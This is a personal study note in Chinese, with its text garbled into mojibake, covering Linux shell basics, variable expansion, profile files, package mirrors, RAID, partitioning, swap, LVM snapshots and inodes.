<h2 id="ç»“æŸè¿›ç¨‹"><a href="#ç»“æŸè¿›ç¨‹" class="headerlink" title="ç»“æŸè¿›ç¨‹"></a>ç»“æŸè¿›ç¨‹</h2><p>kill pid       &#x2F;&#x2F;æ€æ­»è¯¥pidçš„è¿›ç¨‹<br>kill -9 pid    &#x2F;&#x2F;å¼ºåˆ¶æ€æ­»è¯¥è¿›ç¨‹</p>
<h2 id="æŸ¥çœ‹è¿æ¥"><a href="#æŸ¥çœ‹è¿æ¥" class="headerlink" title="æŸ¥çœ‹è¿æ¥"></a>æŸ¥çœ‹è¿æ¥</h2><p>ping IP        &#x2F;&#x2F;æŸ¥çœ‹ä¸æ­¤IPåœ°å€çš„è¿æ¥æƒ…å†µ<br>netstat -an    &#x2F;&#x2F;æŸ¥çœ‹å½“å‰ç³»ç»Ÿç«¯å£<br>netstat -antplu | grep 8080     &#x2F;&#x2F;æŸ¥çœ‹æŒ‡å®šç«¯å£</p>
<h2 id="å¿«é€Ÿæ¸…å±"><a href="#å¿«é€Ÿæ¸…å±" class="headerlink" title="å¿«é€Ÿæ¸…å±"></a>å¿«é€Ÿæ¸…å±</h2><p>ctrl+l &#x2F;&#x2F;æ¸…å±ï¼Œå¾€ä¸Šç¿»å¯ä»¥æŸ¥çœ‹å†å²æ“ä½œ</p>
<h2 id="è¿œç¨‹ä¸»æœº"><a href="#è¿œç¨‹ä¸»æœº" class="headerlink" title="è¿œç¨‹ä¸»æœº"></a>è¿œç¨‹ä¸»æœº</h2><p>ssh IP       &#x2F;&#x2F;è¿œç¨‹ä¸»æœºï¼Œéœ€è¦è¾“å…¥ç”¨æˆ·åå’Œå¯†ç </p>
<h1 id="é¢œè‰²ä¸ç±»å‹çš„å…³ç³»"><a href="#é¢œè‰²ä¸ç±»å‹çš„å…³ç³»" class="headerlink" title="é¢œè‰²ä¸ç±»å‹çš„å…³ç³»"></a>é¢œè‰²ä¸ç±»å‹çš„å…³ç³»</h1><p><a href="Untitled%2089612a0e61964bd0bcf641f9d74c2bb9.csv">Untitled</a></p>
<p><a href="Untitled%20daabe5b96d5f4c8c86a5fe8a42c2f598.csv">Untitled</a></p>
<p><a href="https://www.jb51.net/article/174033.htm">linuxä¸­$ç¬¦å·çš„åŸºç¡€ç”¨æ³•æ€»ç»“_Linux_è„šæœ¬ä¹‹å®¶</a></p>
<p>!! æœ€åä¸€æ¡å‘½ä»¤<br><code>!$</code> å°†ä¸Šä¸€æ¡å‘½ä»¤çš„å‚æ•°åº”ç”¨äºè¿™ä¸€æ¡<br>^R æŸ¥æ‰¾å‘½ä»¤</p>
<p>suåˆ‡æ¢ç”¨æˆ·æ—¶åŠ -ä¸ä¸åŠ çš„åŒºåˆ«<br>åŠ -ï¼šä¼šåŠ è½½åˆ‡æ¢ç”¨æˆ·çš„shellç¯å¢ƒï¼Œè¿è¡Œçš„çš„login shell è¿è¡Œ &#x2F;etc&#x2F;profile &#x2F;etc&#x2F;bashrc  <del>&#x2F;.bashrc ~&#x2F;.bash_profile (</del>&#x2F;.bash_history-å†å²å‘½ä»¤ <del>&#x2F;.bash_logout-å¯ä»¥å†™å…¥å‘½ä»¤åœ¨é€€å‡ºç”¨æˆ·æ—¶æ‰§è¡Œ)é€€å‡ºæ—¶è¿è¡Œ<br>ä¸åŠ -ï¼šä¸ä¼šåŠ è½½ç”¨æˆ·çš„shellç¯å¢ƒï¼Œè¿è¡Œçš„æ˜¯nologin shell &#x2F;etc&#x2F;bashrc ~&#x2F;.bashrc  (</del>&#x2F;bash_history ~&#x2F;bash_logout)é€€å‡ºæ—¶è¿è¡Œ</p>
<p>ls | tee a.txt ä¸| a.txtçš„åŒºåˆ«teeç®¡é“ä¸ä¼šæˆªæµï¼Œå‘½ä»¤ç»“æœä»ç„¶æˆ–è¾“å‡ºåˆ°å±å¹•</p>
<p>&#x2F;etc&#x2F;profile &#x2F;&#x2F;ç³»ç»Ÿå¯åŠ¨çš„æ—¶å€™æ‰æ‰§è¡Œä¸€æ¬¡ï¼Œä¹‹åä¸å†æ‰§è¡Œï¼Œå…¶ä¸­ä¸»è¦å®šä¹‰ä¸€äº›ç¯å¢ƒå˜é‡</p>
<p>~&#x2F;.bashrc  &#x2F;&#x2F;å½“å‰ç”¨æˆ·æ¯æ–°å¼€ä¸€ä¸ªshellå°±æ‰§è¡Œä¸€æ¬¡ ï¼Œå…¶ä¸­ä¸»è¦å®šä¹‰åˆ«åä¹‹ç±»çš„ä¿¡æ¯</p>
<p>ç³»ç»Ÿå¼€æœºæ—¶é¦–å…ˆå»æ‰§è¡Œ&#x2F;etc&#x2F;profileæ–‡ä»¶ï¼Œç„¶åæ ¹æ®å…¶ä¸­çš„å†…å®¹åˆ°&#x2F;etc&#x2F;profile.d&#x2F;ä¸­è¯»å–é¢å¤–çš„è®¾å®šæ–‡æ¡£ã€‚ç„¶åè¯»å–&#x2F;etc&#x2F;bashrcçš„å†…å®¹ã€‚ç„¶åæ ¹æ®ç™»å½•ç”¨æˆ·çš„ä¿¡æ¯å»å¯¹åº”çš„å®¶ç›®å½•è¯»å–<del>&#x2F;.bash_profileï¼Œå¦‚æœä¸èƒ½è¯»å–åˆ™å»è¯»å–</del>&#x2F;.bash_loginï¼Œå¦‚æœä»ä¸èƒ½è¯»å–åˆ™å»è¯»<del>&#x2F;.profileä¸­çš„å†…å®¹ï¼Œè¿™ä¸‰ä¸ªæ–‡ä»¶ä¸­çš„å†…å®¹åŸºæœ¬ä¸€è‡´ã€‚ç„¶åè¯»å–</del>&#x2F;.bashrcä¸­çš„å†…å®¹<br><code>eject //å¼¹å‡ºæŒ‚è½½çš„å…‰ç›˜</code></p>
<h2 id="shell-è„šæœ¬ä¸­ä½¿ç”¨pythonè„šæœ¬"><a href="#shell-è„šæœ¬ä¸­ä½¿ç”¨pythonè„šæœ¬" class="headerlink" title="shell è„šæœ¬ä¸­ä½¿ç”¨pythonè„šæœ¬"></a><strong>shell è„šæœ¬ä¸­ä½¿ç”¨pythonè„šæœ¬</strong></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/bin/python &lt;&lt;-<span class="string">a</span></span><br><span class="line"><span class="string">print(&quot;armandhe&quot;)</span></span><br><span class="line"><span class="string">a</span></span><br><span class="line">\<span class="built_in">ls</span> //ä¸ä½¿ç”¨åˆ«åè¾“å‡ºï¼Œä¾‹ä¸­å°†è¿è¡Œç»“æœå°†ä¸æ˜¾ç¤ºé¢œè‰² </span><br><span class="line"><span class="built_in">unalias</span> <span class="built_in">ls</span> //å–æ¶ˆ<span class="built_in">ls</span>çš„åˆ«å</span><br></pre></td></tr></table></figure>

<p><code>echo -e &quot;\e[1;31m this is a test to change fg color \e[0m&quot; //30-37 å‰æ™¯è‰² echo -e &quot;\e[1;40m this is a test to change fg color \e[0m&quot; //40-47 èƒŒæ™¯è‰²</code></p>
<p>.&#x2F;a.sh<br>bash a.sh<br>å­shellæ‰§è¡Œ<br>. a.sh<br>source a.sh<br>å½“å‰shellæ‰§è¡Œ<br>^k &#x2F;&#x2F;åˆ é™¤å…‰æ ‡åçš„å†…å®¹<br>^a &#x2F;&#x2F;å›åˆ°å‘½ä»¤å¼€å¤´<br>^e &#x2F;&#x2F;å›åˆ°å‘½ä»¤ç»“å°¾<br>^b &#x2F;&#x2F;å…‰æ ‡å‘å‰ç§»åŠ¨ä¸€æ ¼<br>^n &#x2F;&#x2F;æ¸…ç©ºå½“å‰å‘½ä»¤<br>^h &#x2F;&#x2F;é€€æ ¼åˆ é™¤<br>read -p â€œplease type ip addr: â€œ ip &#x2F;&#x2F;æç¤ºç”¨æˆ·è¾“å…¥<br>id username &#x2F;&#x2F;åˆ¤æ–­ç”¨æˆ·æ˜¯å¦å­˜åœ¨</p>
<p>$? &#x2F;&#x2F;ä¸Šä¸€æ¡å‘½ä»¤æ‰§è¡Œçš„ç»“æœ æ‰§è¡Œé™ˆå·¥ä¸º0</p>
<p>env &#x2F;&#x2F;æ˜¾ç¤ºå½“å‰æ‰€æœ‰çš„ç¯å¢ƒå˜é‡</p>
<p>expr $num1 + $num2    expr 1 + 2<br>[ 1 + 2 ]<br>echo $(($num1 + $num2))<br>echo $((num1 + num2))</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">url=[www.baidu.com.cn](https://www.notion.so/www.baidu.com.cn)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url#*.&#125;</span> //baidu.com.cn ä»å‰å¾€ååˆ é™¤åŒ¹é…éƒ¨åˆ†ï¼Œéè´ªå©ªåŒ¹é…</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url##*.&#125;</span> //cn ä»å‰å¾€ååˆ é™¤åŒ¹é…éƒ¨åˆ†ï¼Œè´ªå©ªåŒ¹é…</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url%.cn&#125;</span> // [www.baidu.com](https://www.notion.so/www.baidu.com) ä»åå¾€å‰åˆ é™¤åŒ¹é…éƒ¨åˆ†ï¼Œéè´ªå©ªåŒ¹é…</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url%%.*&#125;</span> //www ä»ç‹å¾€å‰åˆ é™¤åŒ¹é…éƒ¨åˆ†ï¼Œè´ªå©ªåŒ¹é…</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url/c/C&#125;</span> //[www.baidu.Com.cn](https://www.notion.so/www.baidu.Com.cn) å†…å®¹æ›¿æ¢æ›¿æ¢å•ä¸ª</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url//c/C&#125;</span> //[www.baidu.Com.Cn](https://www.notion.so/www.baidu.Com.Cn) å†…å®¹æ›¿æ¢ï¼Œæ›¿æ¢å¤šä¸ª</span><br></pre></td></tr></table></figure>

<p>unset var<br>echo ${var-aaaa} &#x2F;&#x2F;å˜é‡æœªè¢«å®šä¹‰ï¼Œvarçš„å€¼è¢«æ›¿æ¢ä¸ºaaaa</p>
<p>var&#x3D;1<br>echo ${var-aaaa} &#x2F;&#x2F;varæœ‰å€¼ï¼Œå…¶å€¼ä¸èƒ½è¢«æ›¿ä»£</p>
<p>var&#x3D;<br>echo ${var-aaa} &#x2F;&#x2F;varè¢«å®šä¹‰è¿‡ï¼Œå…¶å€¼ä¸å¯è¢«æåˆ°</p>
<p>var&#x3D;<br>echo ${var:-aaaa} &#x2F;&#x2F;varè¢«å®šä¹‰è¿‡ï¼Œä½†ä¸ºç©ºï¼Œå…¶å€¼è¢«æ›¿ä»£ä¸ºaaaa</p>
<p><code>+ :+ =  := ? :ï¼Ÿ</code></p>
<p>let i++<br>let ++i<br>let â€“i<br>let Iâ€“</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..5&#125; <span class="comment">#é›†åˆ</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> 2345</span><br><span class="line"><span class="keyword">done</span> Â  //å¾ªç¯æ‰§è¡Œäº”æ¬¡</span><br><span class="line"></span><br><span class="line"><span class="built_in">date</span>ï¼‰//åœ¨å­shellä¸­æ‰§è¡Œ</span><br></pre></td></tr></table></figure>

<p>((1&lt;2)) &#x2F;&#x2F;ä½¿ç”¨&lt; &gt; ç­‰ç¬¦å·è¿›è¡Œæ¯”è¾ƒ<br>touch $(date +%F)_file.txt &#x2F;&#x2F;å‘½ä»¤æ›¿æ¢ä¸&#96;&#96;æ•ˆæœä¸€è‡´<br>$((1+2))<br>test 1 -eq 2 &#x2F;&#x2F;æ¡ä»¶æµ‹è¯•<br>[ 1 -eq 2 ] &#x2F;&#x2F;æ¡ä»¶æµ‹è¯•<br><code>[[[www.baidu.com](https://www.notion.so/www.baidu.com) =~ *baidu]] //æ¡ä»¶æµ‹è¯• æ­£åˆ™æ¯”è¾ƒæœªæµ‹è¯•æˆåŠŸ</code> æ­£åˆ™æ¯”è¾ƒå¿…é¡»ç”¨è¿™ç§æ ¼å¼<br>&#x3D;~ &#x2F;&#x2F;æŒ‰ç…§æ­£åˆ™æ–¹å¼åŒ¹é…<br>$[1 + 2] &#x2F;&#x2F;æ•´æ•°è¿ç®—<br>{} &#x2F;&#x2F;é›†åˆ{1..8}<br>${} &#x2F;&#x2F;ä½¿ç”¨å˜é‡ï¼Œå®šç•Œ<br><code>export a=1 //ç¯å¢ƒå˜é‡</code></p>
<p>sh -vx a.sh &#x2F;&#x2F;ä»¥è°ƒè¯•çš„æ–¹å¼æ‰§è¡Œ<br>sh -n a.sh &#x2F;&#x2F;ä»…è°ƒè¯•è¯­æ³•æµ‹è¯•</p>
<p>seq 10 &#x2F;&#x2F;ç”Ÿæˆä¸€ä¸ª1-10çš„åºåˆ—</p>
<p>seq 1 10 &#x2F;&#x2F;ç”Ÿæˆ1-10çš„åºåˆ—</p>
<p>seq 1 2 10 &#x2F;&#x2F;ä»¥2ä¸ºæ­¥é•¿ç”Ÿæˆ1-10çš„åºåˆ—</p>
<p>userdel -rf a &#x2F;&#x2F;åˆ é™¤ç”¨æˆ·åŠå…¶å®¶ç›®å½•</p>
<h2 id="æ›´æ”¹centosé•œåƒæº"><a href="#æ›´æ”¹centosé•œåƒæº" class="headerlink" title="æ›´æ”¹centosé•œåƒæº"></a>æ›´æ”¹centosé•œåƒæº</h2><p>é¦–å…ˆå¤‡ä»½åŸé•œåƒé…ç½®æ–‡ä»¶</p>
<p>cp &#x2F;etc&#x2F;yum.repos.d&#x2F;centos-base.repo &#x2F;etc&#x2F;yum.repos.d&#x2F;centos-base.repo.bak</p>
<p>cdåˆ°&#x2F;etc&#x2F;yum.repos.d</p>
<p>ä¸‹è½½ä½ çš„é•œåƒé…ç½®æ–‡ä»¶</p>
<p>wget <a href="http://domain/">http://domain</a>  </p>
<h2 id="å®‰è£…ä¸­æ–‡è¾“å…¥æ³•"><a href="#å®‰è£…ä¸­æ–‡è¾“å…¥æ³•" class="headerlink" title="å®‰è£…ä¸­æ–‡è¾“å…¥æ³•"></a>å®‰è£…ä¸­æ–‡è¾“å…¥æ³•</h2><p>apt-get install fcitx -y &#x2F;&#x2F;å®‰è£…è¾“å…¥æ³•æ¡†æ¶</p>
<p>apt-get install fcitx-googlepinyin</p>
<p>reboot</p>
<p>æœç´¢fcitxå°†è°·æ­Œæ‹¼éŸ³è®¾ç½®ä¸ºé¦–é€‰è¾“å…¥æ³•</p>
<h1 id="ç£ç›˜ç®¡ç†"><a href="#ç£ç›˜ç®¡ç†" class="headerlink" title="ç£ç›˜ç®¡ç†"></a>ç£ç›˜ç®¡ç†</h1><p><a href="https://www.runoob.com/linux/linux-filesystem.html">Linux ç£ç›˜ç®¡ç†</a></p>
<p><a href="%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86%2062b6eff0337a41abbeeec6c6025fb791.csv">ç£ç›˜ç®¡ç†</a></p>
<h1 id="ç£ç›˜ç®¡ç†-1"><a href="#ç£ç›˜ç®¡ç†-1" class="headerlink" title="ç£ç›˜ç®¡ç†"></a>ç£ç›˜ç®¡ç†</h1><h2 id="raid-ç‹¬ç«‹ç£ç›˜å†—ä½™æ•´åˆ—"><a href="#raid-ç‹¬ç«‹ç£ç›˜å†—ä½™æ•´åˆ—" class="headerlink" title="raid-ç‹¬ç«‹ç£ç›˜å†—ä½™æ•´åˆ—"></a>raid-ç‹¬ç«‹ç£ç›˜å†—ä½™æ•´åˆ—</h2><p>åˆ†ä¸ºè½¯ä»¶æ•´åˆ—ä¸ç¡¬ä»¶æ•´åˆ—</p>
<p>raid0 </p>
<p>æ•°æ®å†™å…¥çš„æ—¶å€™ï¼Œè¢«åˆ†æˆNå—ï¼ŒåŒæ—¶å¹¶å‘å†™å…¥ä¸åŒçš„ç£ç›˜ï¼Œæ²¡æœ‰æ ¡éªŒæœºåˆ¶ï¼Œä¸€ä¸ªç£ç›˜æŸåæ‰€æœ‰ç£ç›˜å°±ç®—åäº†ï¼Œé«˜æ•ˆ</p>
<p>raid1</p>
<p>æ•°æ®è¢«å¤åˆ¶nä»½ï¼ŒåŒæ—¶å†™å…¥ä¸åŒçš„ç£ç›˜ï¼Œé€Ÿåº¦æ…¢</p>
<p>raid3</p>
<p>æ•°æ®è¢«åˆ†æˆnä»½å†™å…¥ï¼Œæ·»åŠ äº†æ ¡éªŒæœºåˆ¶ï¼Œä¸€å—ç£ç›˜å•ç‹¬æ¥ä¿å­˜æ ¡éªŒä¿¡æ¯ï¼Œä¸€å—ç£ç›˜æŸåå¯é€šè¿‡æ ¡éªŒä¿¡æ¯æ¥å›å¤ã€‚æ ¡éªŒç£ç›˜æŸååå°±å¤±å»äº†å›å¤çš„èƒ½åŠ›</p>
<p>raid5</p>
<p>æ•°æ®è¢«åˆ†æˆnä»½å†™å…¥ï¼Œæ¯ä¸€å—ç£ç›˜ä¸­éƒ½åŒ…å«äº†å±äºå…¶ä»–ç£ç›˜çš„æ ¡éªŒä¿¡æ¯ï¼Œå½“ä¸€å—ç£ç›˜æŸåäº†ï¼Œå°±å¯ä»¥æ ¹æ®å…¶ä»–ç£ç›˜å›å¤æ•°æ®</p>
<p>raid6</p>
<p>æ•°æ®è¢«åˆ†æˆnä»½å†™å…¥ï¼Œåœ¨raid5çš„åŸºç¡€ä¸Šæ·»åŠ äº†åŒé‡æ ¡éªŒåŠŸèƒ½ï¼Œæ¯ä¸€ä¸ªç£ç›˜éƒ½æœ‰äº†ä¸¤ä»½æ ¡éªŒæ•°æ®</p>
<p>raid10</p>
<p>å…ˆå°†æ•°æ®å¤åˆ¶ä¸¤ä»½ï¼Œæ¯ä¸€ä»½å†æŒ‰ç…§raid0çš„æ–¹å¼å­˜å‚¨</p>
<p>ç£ç›˜</p>
<p>æŸ±é¢ ç£å¤´ æ‰‡åŒº å— åˆ†åŒº</p>
<p>åˆ†åŒº </p>
<p><strong>mbr</strong> ï¼š4ä¸ªåˆ†åŒºï¼Œ3ä¸ªä¸»åˆ†åŒº+1ä¸ªé€»è¾‘åˆ†åŒº æ‰‡åŒº 512å­—èŠ‚ 0å·æ‰‡åŒºä¸­åŒ…æ‹¬226å­—èŠ‚çš„bootloader 64å­—èŠ‚çš„åˆ†åŒºè¡¨ï¼Œ2å­—èŠ‚çš„è¡¨å€¼ ä¸€ä¸ªåˆ†åŒºå ç”¨16å­—èŠ‚ï¼Œæ•…æœ€å¤šåªèƒ½æœ‰4ä¸ªåˆ†åŒºï¼Œæœ€å¤šæœ‰2<strong>16*4ä¸ªæ‰‡åŒºï¼Œ2</strong>16<em>512</em>4 å­—èŠ‚çš„å­˜å‚¨ç©ºé—´ã€‚</p>
<p>**gptï¼š**ç¬¬ä¸€ä¸ªæ‰‡åŒºå®šä¹‰äº†åˆ†åŒºçš„æ•°é‡ç­‰ä¿¡æ¯ï¼Œç¬¬äºŒä¸ªæ‰‡åŒºä¸ºåˆ†åŒºè¡¨å¤´ï¼Œç¬¬ä¸‰ä¸ªæ‰‡åŒºå¼€å§‹ä¸ºåˆ†åŒºè¡¨ï¼Œgptåˆ†åŒºä¸€èˆ¬æœ‰32ä¸ªæ‰‡åŒºçš„åˆ†åŒºè¡¨ï¼Œä¸€ä¸ªæ‰‡åŒºå¯ä»¥æœ‰4ä¸ªåˆ†åŒºä¿¡æ¯ï¼Œé‚£ä¹ˆä¸€ä¸ªåˆ†åŒºå°±æœ‰128ä½ï¼Œæ•…ä¸€å…±å¯ä»¥æœ‰128ä¸ªåˆ†åŒºï¼Œæ‰€ä»¥åŸºæœ¬ä¸Šä¸ä¼šæœ‰åˆ†åŒºå¤§å°ä¸åˆ†åŒºæ•°é‡çš„é™åˆ¶ã€‚</p>
<p>ç¡¬ç›˜æ¥å£ç±»å‹</p>
<p>ide sata scsi sasç­‰æ¥å£</p>
<p>æŸ¥çœ‹åˆ†åŒºä¿¡æ¯</p>
<p>partx &#x2F;dev&#x2F;sda &#x2F;&#x2F;</p>
<p>cat &#x2F;proc&#x2F;partitions &#x2F;&#x2F;æ˜¾ç¤ºåˆ†åŒºä¿¡æ¯</p>
<p>partprobe &#x2F;dev&#x2F;sda &#x2F;&#x2F;é‡æ–°åŠ è½½ç¡¬ç›˜ä¿¡æ¯</p>
<p>linux vfs-è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿã€‚å¯¹åº•å±‚æ–‡ä»¶ç³»ç»Ÿçš„æŠ½è±¡ï¼Œç”¨æˆ·ä½¿ç”¨è¯¥æ–‡ä»¶ç³»ç»Ÿæ“ä½œæ–‡ä»¶</p>
<h2 id="ç¡¬ç›˜åˆ†åŒºæ­¥éª¤"><a href="#ç¡¬ç›˜åˆ†åŒºæ­¥éª¤" class="headerlink" title="ç¡¬ç›˜åˆ†åŒºæ­¥éª¤"></a>ç¡¬ç›˜åˆ†åŒºæ­¥éª¤</h2><p>åˆ†åŒº</p>
<p>æ ¼å¼åŒ–æ–‡ä»¶ç³»ç»Ÿ</p>
<p>æŒ‚è½½ï¼šä¸´æ—¶æŒ‚è½½ï¼Œæ°¸ä¹…æŒ‚è½½-ä¿®æ”¹&#x2F;etc&#x2F;fstab</p>
<p>mount -a &#x2F;&#x2F;é‡è¯»æŒ‚è½½è¡¨</p>
<h2 id="äº¤æ¢åˆ†åŒº"><a href="#äº¤æ¢åˆ†åŒº" class="headerlink" title="äº¤æ¢åˆ†åŒº"></a>äº¤æ¢åˆ†åŒº</h2><p>å†…å­˜ä¸­ä¸å¸¸ç”¨çš„æ•°æ®å¯æ”¾åœ¨äº¤æ¢åˆ†åŒºä¸­ï¼Œwindowä¸­å«åšè™šæ‹Ÿå†…å­˜</p>
<p>m &#x2F;&#x2F;æŸ¥çœ‹å¸®åŠ©</p>
<p>fsdisk &#x2F;dev&#x2F;sda</p>
<p>åˆ†åŒº</p>
<p>t  &#x2F;&#x2F; è¾“å…¥åˆ†åŒºç¼–å·ä¸º82ï¼Œé€šçœ‹åˆ†åŒºç±»å‹ï¼Œ82ä¸ºäº¤æ¢åˆ†åŒº</p>
<p>é‡æ–°åŠ è½½åˆ†åŒºè¡¨ partprobe &#x2F;dev&#x2F;sda</p>
<p>mkswap &#x2F;dev&#x2F;sda3 &#x2F;&#x2F;åˆ›å»ºäº¤æ¢åˆ†åŒº</p>
<p>swapon  &#x2F;dev&#x2F;sda3 &#x2F;&#x2F;å¼€å¯äº¤æ¢åˆ†åŒº</p>
<p>swapoff &#x2F;dev&#x2F;sda3 &#x2F;&#x2F;å…³é—­äº¤æ¢åˆ†åŒº</p>
<h2 id="ç£ç›˜æŒ‚è½½é…ç½®æ–‡ä»¶"><a href="#ç£ç›˜æŒ‚è½½é…ç½®æ–‡ä»¶" class="headerlink" title="ç£ç›˜æŒ‚è½½é…ç½®æ–‡ä»¶"></a>ç£ç›˜æŒ‚è½½é…ç½®æ–‡ä»¶</h2><p>è¿›å…¥&#x2F;dev&#x2F;fstable</p>
<p>&#x2F;dev&#x2F;mapper&#x2F;centos-root &#x2F; xfs defaults 0 0 </p>
<p>è®¾å¤‡æ–‡ä»¶ æŒ‚è½½ç‚¹ æ–‡ä»¶ç³»ç»Ÿç±»å‹ æŒ‚è½½é€‰é¡¹ æ£€æµ‹é¡ºåº0è¡¨ç¤ºä¸æ£€æµ‹ è½¬å­˜</p>
<p>mount -a &#x2F;&#x2F;é‡è¯»æŒ‚è½½è¡¨</p>
<h2 id="LVM-logic-volume-manager-é€»è¾‘å·ç®¡ç†å™¨"><a href="#LVM-logic-volume-manager-é€»è¾‘å·ç®¡ç†å™¨" class="headerlink" title="LVM-logic volume manager é€»è¾‘å·ç®¡ç†å™¨"></a>LVM-logic volume manager é€»è¾‘å·ç®¡ç†å™¨</h2><p>å°†ä¸åŒçš„ç¡¬ç›˜é€»è¾‘åˆ’åˆ†ä¸ºä¸åŒçš„åˆ†åŒº</p>
<p>pv-ç‰©ç†å· æ•´å—ç‰©ç†ç¡¬ç›˜æˆ–è€…ä»–ä¸Šé¢çš„åˆ†åŒº</p>
<p>pe-ç‰©ç†åŒºåŸŸ  extent </p>
<p>vg-å·ç»„</p>
<p>lv-é€»è¾‘å·</p>
<p>le é€»è¾‘åŒºåŸŸ</p>
<p>å·ç»„æè¿°åŒºåŸŸ</p>
<h3 id="åˆ›å»ºé€»è¾‘å·è¿‡ç¨‹"><a href="#åˆ›å»ºé€»è¾‘å·è¿‡ç¨‹" class="headerlink" title="åˆ›å»ºé€»è¾‘å·è¿‡ç¨‹"></a>åˆ›å»ºé€»è¾‘å·è¿‡ç¨‹</h3><ol>
<li><p>åˆ›å»ºç‰©ç†å·</p>
<p> pvcreat &#x2F;dev&#x2F;sda1</p>
<p> pvcreat &#x2F;dev&#x2F;sda2</p>
</li>
<li><p>åˆ›å»ºå·ç»„</p>
<p> vgcreat volumegroupname &#x2F;dev&#x2F;sda{1,2}</p>
</li>
<li><p>åˆ›å»ºé€»è¾‘å·</p>
<p> lvcreat -L|â€”size volumesize vgname -n lvname</p>
</li>
</ol>
<p>æ ¼å¼åŒ–é€»è¾‘å·</p>
<p>mkfs.ext4 &#x2F;dev&#x2F;vgname&#x2F;lvname</p>
<p>mkfs -t ext4 &#x2F;dev&#x2F;vgname&#x2F;lvname</p>
<p>æŒ‚è½½</p>
<p>mount &#x2F;dev&#x2F;vgname&#x2F;lvname æŒ‚è½½ç‚¹</p>
<p>æ‰©å±•é€»è¾‘å·</p>
<p>lvextend -L +extendsize &#x2F;dev&#x2F;vgname&#x2F;lvname</p>
<p>æ‰©å±•æ–‡ä»¶ç³»ç»Ÿ</p>
<p>resize2fs &#x2F;dev&#x2F;vgname&#x2F;lvname</p>
<p>æ‰©å±•å·ç»„</p>
<p>vgextend vgname &#x2F;dev&#x2F;sda3</p>
<p>åˆ¶ä½œå¿«ç…§åˆ†åŒº</p>
<p>lvcreate -L lvsize -n snapshot-lvname -s(æŒ‡å®šä¸ºå¿«ç…§å·) lvname</p>
<p>æŒ‚è½½å¿«ç…§å·</p>
<p>mount -r &#x2F;dev&#x2F;vgname&#x2F;lvname æŒ‚è½½è·¯å¾„</p>
<h3 id="å¤‡ä»½æ•°æ®"><a href="#å¤‡ä»½æ•°æ®" class="headerlink" title="å¤‡ä»½æ•°æ®"></a>å¤‡ä»½æ•°æ®</h3><p><strong>å¤‡ä»½ç±»å‹</strong></p>
<p>å†·å¤‡-ç¦»çº¿å¤‡ä»½</p>
<p>æ¸©å¤‡-åªè¯»å¤‡ä»½</p>
<p>çƒ­å¤‡-è¯»å†™å¤‡ä»½</p>
<p>å‡ ä¹çƒ­å¤‡</p>
<p>å¿«ç…§å·çš„å¤§å°æ˜¯æ•°æ®å˜åŒ–çš„å¤§å°</p>
<p>æ‹æ‘„äº†å¿«ç…§ä¹‹åï¼Œå½“åŸå·å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ï¼Œå¿«ç…§å°†è·å–å˜åŒ–ä¿¡æ¯ï¼Œå¹¶è¿›è¡Œå†™å…¥å¿«ç…§ã€‚å†™æ—¶å¤åˆ¶ã€‚</p>
<p><strong>å¤‡ä»½è¿‡ç¨‹-å‡ ä¹çƒ­å¤‡</strong></p>
<p>é¦–å…ˆé”å®šè¦å¤‡ä»½çš„æ–‡ä»¶ï¼Œç„¶åæ‹æ‘„å¿«ç…§ï¼Œç„¶åè§£é”ï¼Œç„¶åæ ¹æ®å¿«ç…§å¯¹æ•°æ®è¿›è¡Œå¤‡ä»½ã€‚</p>
<h2 id="inode-ç´¢å¼•èŠ‚ç‚¹"><a href="#inode-ç´¢å¼•èŠ‚ç‚¹" class="headerlink" title="inode-ç´¢å¼•èŠ‚ç‚¹"></a>inode-ç´¢å¼•èŠ‚ç‚¹</h2><p><a href="https://blog.csdn.net/xuz0917/article/details/79473562">Linuxçš„inodeçš„ç†è§£_çŒ¿å­-CSDNåšå®¢_inode</a></p>
<p>ç£ç›˜çš„æœ€å°å­˜å‚¨å•ä½å«åšæ‰‡åŒºï¼Œæ“ä½œç³»ç»Ÿçš„æœ€å°æ“ä½œå•ä½å«åšå—ï¼Œä¸€ä¸ªå—ç”±8ä¸ªæ‰‡åŒºç»„æˆã€‚ä¸€ä¸ªæ‰‡åŒº512bytesï¼Œæ‰€ä»¥ä¸€ä¸ªå—4k</p>
<p>æ–‡ä»¶æ•°æ®å­˜å‚¨åœ¨å—blockä¸­ï¼Œå…¶ä»–å¦‚æ—¶é—´ã€åˆ›å»ºè€…ç­‰ä¿¡æ¯å‚¨å­˜åœ¨å¦ä¸€ä¸ªåŒºåŸŸï¼Œè¿™ä¸ªå­˜å‚¨æ–‡ä»¶å…ƒä¿¡æ¯çš„åŒºåŸŸå°±å«åšinodeï¼Œå³ç´¢å¼•èŠ‚ç‚¹ã€‚</p>
<p><strong>å…¶ä¸­åŒ…å«</strong></p>
<p>æ–‡ä»¶çš„å¤§å°</p>
<p>uid</p>
<p>gid</p>
<p>æƒé™</p>
<p>æ—¶é—´æˆ³ï¼šè®¿é—®ã€ä¿®æ”¹ã€inodeå˜åŠ¨æ—¶é—´</p>
<p>links</p>
<p>inodeå·ç </p>
<p>blocksæ•°</p>
<p>ioblockå—å¤§å°</p>
<p>è®¾å¤‡å·ç </p>
<p>ä¸€ä¸ªinodeèŠ‚ç‚¹çš„å¤§å°ä¸€èˆ¬æ˜¯128æˆ–è€…256å­—èŠ‚ï¼Œåœ¨æ ¼å¼åŒ–çš„æ—¶å€™ä¸€èˆ¬æ—¶æ¯1kBæˆ–è€…2kBå°±è®¾ç½®ä¸€ä¸ªinodeèŠ‚ç‚¹ã€‚</p>
